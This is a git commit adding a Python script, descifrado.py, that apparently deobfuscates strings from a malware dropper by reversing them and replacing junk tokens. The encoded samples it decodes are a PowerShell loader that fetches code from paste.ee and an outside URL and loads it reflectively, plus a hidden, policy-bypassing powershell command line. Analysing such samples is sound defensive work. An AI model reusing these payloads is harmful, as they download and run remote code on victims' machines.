95c01d4c3782ab7714424fe8243d082467daa752
Esteban Jaramillo Sarmiento <26073885+Steve0929@users.noreply.github.com>
2020-11-18 22:07:26 -0500

    Create descifrado.py

---
+++ descifrado.py
@@ -0,0 +1,36 @@
+'''
+txt = '"JGRsbCA9ICcwLzhKTWgxL3IvZWUuZXRzYXAvLzpzcHR0" &  xobgsmvfUYPJ + xobgsmvfUYPPDLNWjJ + xobgsmvfUYPJ & "Cc7JFJ1bXBlRCA9IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Ry" &  xobgsmvfUYPJ + xobgsmvfUYPPDLNWjJ + xobgsmvfUYPJ & "W5nKCAkZGxsWy0xLi4tJGRsbC5MZW5ndGhdIC1qb2luICcnICk7W0J5dGVbXV0gJFJ1bXBlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggJFJ1bXBlRFstMS4uLSRSdW1wZUQuTGVuZ3RoXSAt" &  xobgsmvfUYPJ + xobgsmvfUYPPDLNWjJ + xobgsmvfUYPJ & "m9pbiAnJyApO1tSZWZsZWN0" &  xobgsmvfUYPJ + xobgsmvfUYPPDLNWjJ + xobgsmvfUYPJ & "W9uLkFzc2VtYmx5XTo6TG9hZCgkUnVtcGUpLkdldFR5cGUoJ2VudC5DbGFzczEnKS5HZXRNZXRob2QoJ1J1bicpLkludm9rZSgkbnVsbCwgW29i" &  xobgsmvfUYPJ + xobgsmvfUYPPDLNWjJ + xobgsmvfUYPJ & "mVjdFtdXSAoJ3R4dC4yNjYwMjQwODIxMS9zYnYvZXJvdHMuc2J2bGUvLzpwdHRoJykp"('
+
+txt = txt.replace("xobgsmvfUYPJ", "ñ")
+txt = txt.replace("xobgsmvfUYPPDLNWjJ", "2")
+
+x = txt.replace("ñ + 2 + ñ", "a")
+print(x)
+
+print(x.find("dna"))
+'''
+
+print("-----------------")
+JPYUfvmsgbox = " "
+JjWNLDPPYUfvmsgbox = "/ BBBB" + "BBBBBBB" + "BBBBBBB" + "BBBBBBBB /"
+st =  "pkyJoRHdwpzLvUGb2J2cuMHdvJXZvYnYz9SMxIDOwQjMwYjNy4Cd4R3JoASXdtFdjVm" + JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox  + "i92WgwCbsVnbkgSZr9mdulkLpcib1J1JoQ2boRXZNRXZH5SKnEzczFGbD5CduV2JoUGc5RFdldkLpUGctVnUkgCZh9GT6oTX5xmYtV2czFkLu9W" + JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox  + "0NWZsZWZSt1OpAyJnAibp9m" + JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox  + "tASXoR3ZuVGTuQUZw1WdSRSLu4SMtsFRlBXb1JFJggyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DIlBXb1JFJg0VXbVGd5J0W7kCIncCIul2bq1CIdhGdn5WZM5CbsRGJt4iLx0yWsxGZkACKn5W" + JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox  + "yR3UkF2bs52dvRkLpQnbllGbDJWZX5Cdl5EI0NWZqJ2TtcXZOhCI9ACRlBXb1JFJ7cC" + JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox  + "0RHczpzLvAXYzRXZuUWZvI3LxgWTKhzLwcCI9ACbsRGJ"
+st = st[::-1]
+
+replaced = st.replace(JPYUfvmsgbox + JjWNLDPPYUfvmsgbox + JPYUfvmsgbox , "a")
+#print(replaced)
+
+frag1 = "DxujWOlKRCRivUfx dna" + "mmoCPSHW" + "LvKryD elifor" + "PoNPSHWLvKryD ssapyB " + "yciloPnoituce" + "xEPSHWLvKryD nedd" + "ih elytswodniwP" + "SHWLvKryD exepnYe" + "LUSloBllehsrewop;) " + ")ogidoClKRCRiv" + "Ufx(gnirtS46esaBmorF::TmxOOg" + "DLWOtrevnoCpnYeLUSloBmetsyS[ (gnir" + "tSteGpnYeLUSloBIICSA:" +  ":TmxOOgDLWOgnidocnEpnYeLUSlo" + "BtxeTpnYeLUSloBmetsyS[ = D" + "xujWOlKRCRivUfx;".replace("pnYeLUSloB", ".")
+#print(frag1)
+
+frag2= frag1.replace("PSHW" + "LvKryD", "-")
+frag3= frag2.replace("TmxOO" + "gDLWO", "]")
+frag4= frag3.replace("lKRCR" + "ivUfx", "$")
+frag5= replaced + frag4[::-1]
+print("-----------------------")
+print(frag5)
+print("-----------------------")
+DUlTYyYKDH = "dnemqfY" + "vLQmqmmoCBfoW" + "iCMZsb elif" + "orPoNBfoWiC" + "MZsb ssemqfYvLQmq" + "pyB yciloPno" + "itucexEB" + "foWiCMZsb ne" + "ddih elytswodni" + "wBfoWiCMZsb ex" + "e.llehsrewop"
+LYlrrjgWPN  = DUlTYyYKDH.replace("Bfo" + "WiCMZsb" , "-")
+vWadDcXcOW  = LYlrrjgWPN.replace("emqfYvL" + "Qmq" , "a" )
+print(vWadDcXcOW[::-1])
+
